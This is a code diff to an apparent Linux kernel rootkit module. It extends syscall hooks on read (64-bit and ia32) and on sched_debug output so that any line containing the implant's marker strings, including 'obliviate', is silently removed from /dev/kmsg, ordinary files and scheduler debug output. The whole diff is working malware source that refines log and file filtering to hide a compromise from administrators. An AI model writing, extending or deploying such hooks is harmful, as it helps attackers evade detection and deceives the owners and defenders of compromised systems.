@@ -3,6 +3,16 @@
 #include "../include/clear_taint_dmesg.h"
 
 #define MAX_CAP (64*1024)
+#define MIN_KERNEL_READ 256
+
+static const char *virtual_fs_types[] = {
+    "proc",
+    "procfs",
+    "sysfs",
+    "tracefs",
+    "debugfs",
+    NULL
+};
 
 static asmlinkage ssize_t (*orig_read)(const struct pt_regs *regs);
 static asmlinkage ssize_t (*orig_read_ia32)(const struct pt_regs *regs);
@@ -47,25 +57,17 @@ notrace static bool line_contains_sensitive_info(const char *line) {
             strstr(line, "obliviate") != NULL);
 }
 
-notrace static ssize_t filter_kmsg_line(char __user *user_buf, ssize_t bytes_read) {
-    if (bytes_read <= 0 || !user_buf)
-        return bytes_read;
-
-    char *kernel_buf = kmalloc(bytes_read + 1, GFP_KERNEL);
-    if (!kernel_buf)
-        return bytes_read;
-
-    if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
-        kfree(kernel_buf);
-        return bytes_read;
+notrace static bool is_virtual_file(struct file *file) {
+    if (!file || !file->f_path.mnt || !file->f_path.mnt->mnt_sb || !file->f_path.mnt->mnt_sb->s_type)
+        return false;
+    const char *fsname = file->f_path.mnt->mnt_sb->s_type->name;
+    if (!fsname)
+        return false;
+    for (int i = 0; virtual_fs_types[i]; i++) {
+        if (strcmp(fsname, virtual_fs_types[i]) == 0)
+            return true;
     }
-
-    kernel_buf[bytes_read] = '\0';
-
-    ssize_t ret = line_contains_sensitive_info(kernel_buf) ? 0 : bytes_read;
-
-    kfree(kernel_buf);
-    return ret;
+    return false;
 }
 
 notrace static ssize_t filter_buffer_content(char __user *user_buf, ssize_t bytes_read) {
@@ -96,24 +98,32 @@ notrace static ssize_t filter_buffer_content(char __user *user_buf, ssize_t byte
     char *line_end;
 
     while ((line_end = strchr(line_start, '\n'))) {
-        *line_end = '\0';
+        size_t line_len = line_end - line_start;
+        char saved = line_end[0];
+        line_end[0] = '\0';
         if (!line_contains_sensitive_info(line_start)) {
-            size_t line_len = strlen(line_start);
-            if (filtered_len + line_len + 1 <= bytes_read) {
+            if (filtered_len + line_len + 1 <= (size_t)bytes_read) {
                 memcpy(filtered_buf + filtered_len, line_start, line_len);
                 filtered_len += line_len;
                 filtered_buf[filtered_len++] = '\n';
             }
         }
+        line_end[0] = saved;
         line_start = line_end + 1;
     }
 
     if (*line_start && !line_contains_sensitive_info(line_start)) {
         size_t line_len = strlen(line_start);
-        if (filtered_len + line_len <= bytes_read) {
+        if (filtered_len + line_len <= (size_t)bytes_read) {
             memcpy(filtered_buf + filtered_len, line_start, line_len);
             filtered_len += line_len;
         }
+    }
+
+    if (filtered_len == 0) {
+        kfree(kernel_buf);
+        kfree(filtered_buf);
+        return 0;
     }
 
     if (copy_to_user(user_buf, filtered_buf, filtered_len)) {
@@ -127,12 +137,135 @@ notrace static ssize_t filter_buffer_content(char __user *user_buf, ssize_t byte
     return filtered_len;
 }
 
+notrace static ssize_t filter_kmsg_line(char __user *user_buf, ssize_t bytes_read) {
+    if (bytes_read <= 0 || !user_buf)
+        return bytes_read;
+
+    char *kernel_buf = kmalloc(bytes_read + 1, GFP_KERNEL);
+    if (!kernel_buf)
+        return bytes_read;
+
+    if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
+        kfree(kernel_buf);
+        return bytes_read;
+    }
+    kernel_buf[bytes_read] = '\0';
+
+    ssize_t ret = line_contains_sensitive_info(kernel_buf) ? 0 : bytes_read;
+
+    kfree(kernel_buf);
+    return ret;
+}
+
+notrace static ssize_t read_and_filter(struct file *file, char __user *user_buf, size_t user_count) {
+    ssize_t to_read;
+    ssize_t got;
+    char *kbuf = NULL;
+    char *filtered = NULL;
+    loff_t pos;
+    ssize_t ret = 0;
+
+    if (!file || !user_buf)
+        return -EFAULT;
+
+    if (user_count <= 1)
+        return 0;
+
+    if (is_virtual_file(file)) {
+        return -EOPNOTSUPP;
+    }
+
+    to_read = user_count;
+    if (to_read < MIN_KERNEL_READ)
+        to_read = MIN_KERNEL_READ;
+    if (to_read > MAX_CAP)
+        to_read = MAX_CAP;
+
+    kbuf = kmalloc(to_read + 1, GFP_KERNEL);
+    if (!kbuf)
+        return -ENOMEM;
+
+    pos = file->f_pos;
+    got = kernel_read(file, kbuf, to_read, &pos);
+    if (got < 0) {
+        kfree(kbuf);
+        return -EOPNOTSUPP;
+    }
+
+    file->f_pos = pos;
+
+    if (got == 0) {
+        kfree(kbuf);
+        return 0;
+    }
+
+    if (got > to_read)
+        got = to_read;
+    kbuf[got] = '\0';
+
+    filtered = kzalloc(got + 1, GFP_KERNEL);
+    if (!filtered) {
+        kfree(kbuf);
+        return -ENOMEM;
+    }
+
+    size_t filtered_len = 0;
+    char *buffer_end = kbuf + got;
+    char *line_start = kbuf;
+    char *line_end;
+
+    while ((line_end = memchr(line_start, '\n', buffer_end - line_start))) {
+        size_t l = line_end - line_start;
+        char saved = line_end[0];
+        line_end[0] = '\0';
+        if (!line_contains_sensitive_info(line_start)) {
+            if (filtered_len + l + 1 <= (size_t)got) {
+                memcpy(filtered + filtered_len, line_start, l);
+                filtered_len += l;
+                filtered[filtered_len++] = '\n';
+            }
+        }
+        line_end[0] = saved;
+        line_start = line_end + 1;
+    }
+
+    if (line_start < buffer_end) {
+        if (!line_contains_sensitive_info(line_start)) {
+            size_t l = buffer_end - line_start;
+            if (filtered_len + l <= (size_t)got) {
+                memcpy(filtered + filtered_len, line_start, l);
+                filtered_len += l;
+            }
+        }
+    }
+
+    if (filtered_len == 0) {
+        kfree(kbuf);
+        kfree(filtered);
+        return 0;
+    }
+
+    size_t to_copy = (filtered_len > user_count) ? user_count : filtered_len;
+    if (copy_to_user(user_buf, filtered, to_copy)) {
+        kfree(kbuf);
+        kfree(filtered);
+        return -EFAULT;
+    }
+
+    ret = (ssize_t)to_copy;
+    kfree(kbuf);
+    kfree(filtered);
+    return ret;
+}
+
 static notrace asmlinkage ssize_t hook_read(const struct pt_regs *regs) {
     if (!orig_read)
         return -EINVAL;
 
     int fd = regs->di;
     char __user *user_buf = (char __user *)regs->si;
+    size_t count = (size_t)regs->dx;
+
     if (!user_buf)
         return -EFAULT;
 
@@ -150,23 +283,33 @@ static notrace asmlinkage ssize_t hook_read(const struct pt_regs *regs) {
     }
 
     bool is_kmsg = is_kmsg_device(filename);
-    fput(file);
+    ssize_t res = 0;
 
     if (is_kmsg) {
-        ssize_t result;
         do {
-            result = orig_read(regs);
-            if (result <= 0)
-                return result;
-            result = filter_kmsg_line(user_buf, result);
-        } while (result == 0);
-        return result;
-    } else {
-        ssize_t bytes_read = orig_read(regs);
-        if (bytes_read <= 0)
-            return bytes_read;
-        return filter_buffer_content(user_buf, bytes_read);
+            res = orig_read(regs);
+            if (res <= 0)
+                break;
+            res = filter_kmsg_line(user_buf, res);
+        } while (res == 0);
+        fput(file);
+        return res;
     }
+
+    res = read_and_filter(file, user_buf, count);
+    if (res == -EOPNOTSUPP) {
+        ssize_t orig_res = orig_read(regs);
+        if (orig_res <= 0) {
+            fput(file);
+            return orig_res;
+        }
+        res = filter_buffer_content(user_buf, orig_res);
+        fput(file);
+        return res;
+    }
+
+    fput(file);
+    return res;
 }
 
 static notrace asmlinkage ssize_t hook_read_ia32(const struct pt_regs *regs) {
@@ -175,6 +318,8 @@ static notrace asmlinkage ssize_t hook_read_ia32(const struct pt_regs *regs) {
 
     int fd = regs->bx;
     char __user *user_buf = (char __user *)regs->cx;
+    size_t count = (size_t)regs->dx;
+
     if (!user_buf)
         return -EFAULT;
 
@@ -192,23 +337,33 @@ static notrace asmlinkage ssize_t hook_read_ia32(const struct pt_regs *regs) {
     }
 
     bool is_kmsg = is_kmsg_device(filename);
-    fput(file);
+    ssize_t res = 0;
 
     if (is_kmsg) {
-        ssize_t result;
         do {
-            result = orig_read_ia32(regs);
-            if (result <= 0)
-                return result;
-            result = filter_kmsg_line(user_buf, result);
-        } while (result == 0);
-        return result;
-    } else {
-        ssize_t bytes_read = orig_read_ia32(regs);
-        if (bytes_read <= 0)
-            return bytes_read;
-        return filter_buffer_content(user_buf, bytes_read);
+            res = orig_read_ia32(regs);
+            if (res <= 0)
+                break;
+            res = filter_kmsg_line(user_buf, res);
+        } while (res == 0);
+        fput(file);
+        return res;
     }
+
+    res = read_and_filter(file, user_buf, count);
+    if (res == -EOPNOTSUPP) {
+        ssize_t orig_res = orig_read_ia32(regs);
+        if (orig_res <= 0) {
+            fput(file);
+            return orig_res;
+        }
+        res = filter_buffer_content(user_buf, orig_res);
+        fput(file);
+        return res;
+    }
+
+    fput(file);
+    return res;
 }
 
 static notrace int hook_sched_debug_show(struct seq_file *m, void *v) {
@@ -236,6 +391,8 @@ static notrace int hook_sched_debug_show(struct seq_file *m, void *v) {
                 seq_printf(m, "%s\n", line);
             line = line_ptr + 1;
         }
+        if (*line && !line_contains_sensitive_info(line))
+            seq_printf(m, "%s", line);
     }
 
     kfree(buf);
